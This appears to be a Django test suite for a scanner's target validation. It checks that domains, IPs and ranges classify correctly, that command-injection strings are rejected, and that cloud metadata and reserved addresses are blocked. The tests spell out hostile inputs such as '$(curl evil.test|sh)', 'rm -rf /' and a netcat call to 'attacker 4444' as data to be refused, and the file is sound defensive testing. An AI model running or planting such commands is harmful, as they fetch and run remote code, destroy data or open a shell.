from django.test import SimpleTestCase

from targetApp import target_types as tt


class ClassifyTargetTests(SimpleTestCase):
	def test_plain_domain_and_ip_still_classify(self):
		self.assertEqual(tt.classify_target('example.com'), tt.DOMAIN)
		self.assertEqual(tt.classify_target('sub.example.com'), tt.DOMAIN)
		self.assertEqual(tt.classify_target('203.0.113.9'), tt.IP)
		self.assertEqual(tt.classify_target('2001:db8::1'), tt.IP)
		self.assertEqual(tt.classify_target('10.0.0.0/8'), tt.CIDR)
		self.assertEqual(tt.classify_target('192.168.1.1-192.168.1.20'), tt.RANGE)
		self.assertEqual(tt.classify_target('192.168.1.1-254'), tt.RANGE)

	def test_ipv6_zone_scope_id_is_rejected(self):
		# ipaddress.ip_address() accepts this with near-arbitrary text after '%'; it must never
		# become a Domain.name (it would reach nmap/bbot/nuclei as a CLI argument).
		self.assertIsNone(tt.classify_target('fe80::1%eth0'))
		self.assertIsNone(tt.classify_target('fe80::1%$(curl evil.test|sh)'))

	def test_shell_metacharacters_are_rejected_as_domains(self):
		for bad in ('$(curl evil.test|sh)', 'evil.test; rm -rf /', 'evil.test`whoami`',
		            'evil.test|nc attacker 4444', '-oG /tmp/pwned.xml', 'a b.com', ''):
			self.assertIsNone(tt.classify_target(bad), bad)

	def test_url_credentials_style_string_is_not_a_domain(self):
		# "user@host" with no port is not a valid domain label and must not classify as one.
		self.assertIsNone(tt.classify_target('$(id)@evil.test'))

	def test_whitespace_only_or_empty_is_rejected(self):
		self.assertIsNone(tt.classify_target(''))
		self.assertIsNone(tt.classify_target('   '))
		self.assertIsNone(tt.classify_target(None))


class EmbeddedAndMetadataAddressTests(SimpleTestCase):
	def test_embedded_ipv4_forms_are_judged_by_the_address_they_reach(self):
		from targetApp.target_types import is_scannable_ip
		for blocked in ('64:ff9b::7f00:1', '64:ff9b::a9fe:a9fe', '2002:7f00:1::', '2002:a9fe:a9fe::1', '::127.0.0.1', '::ffff:7f00:1',
						'2001::1', 'fec0::1', '64:ff9b:1::1'):
			self.assertFalse(is_scannable_ip(blocked), blocked)
		self.assertTrue(is_scannable_ip('64:ff9b::808:808'))
		self.assertTrue(is_scannable_ip('2002:808:808::1'))

	def test_cloud_metadata_and_reserved_ranges_are_blocked_even_when_private_targets_are_allowed(self):
		from targetApp.target_types import is_scannable_ip
		for blocked in ('168.63.129.16', '192.0.0.192', '198.18.0.1', '240.0.0.1', '255.255.255.255', '100.100.100.200', 'fd00:ec2::254'):
			self.assertFalse(is_scannable_ip(blocked, allow_private=True), blocked)
		self.assertTrue(is_scannable_ip('10.1.2.3', allow_private=True))
		self.assertTrue(is_scannable_ip('8.8.8.8'))


class BoundedResolutionTests(SimpleTestCase):
	def test_names_are_checked_in_parallel_and_a_hung_lookup_does_not_stall_the_batch(self):
		import time
		from unittest import mock

		from targetApp import target_types

		def lookup(name):
			if name.startswith('hang'):
				time.sleep(3)
			return name.startswith('bad')

		started = time.monotonic()
		with mock.patch.object(target_types, 'resolves_to_blocked', side_effect=lookup):
			blocked = target_types.blocked_names(['bad1.example', 'ok.example'] + [f'hang{i}.example' for i in range(8)],
												 workers=4, budget=1, timeout=0.3)
		self.assertEqual(blocked, {'bad1.example'})
		self.assertLess(time.monotonic() - started, 2.5)

	def test_a_single_slow_lookup_gives_up(self):
		import time
		from unittest import mock

		from targetApp import target_types
		with mock.patch.object(target_types, '_lookup_blocked', lambda name: time.sleep(2) or True):
			started = time.monotonic()
			self.assertFalse(target_types.resolves_to_blocked('slow.example', timeout=0.2))
			self.assertLess(time.monotonic() - started, 1)
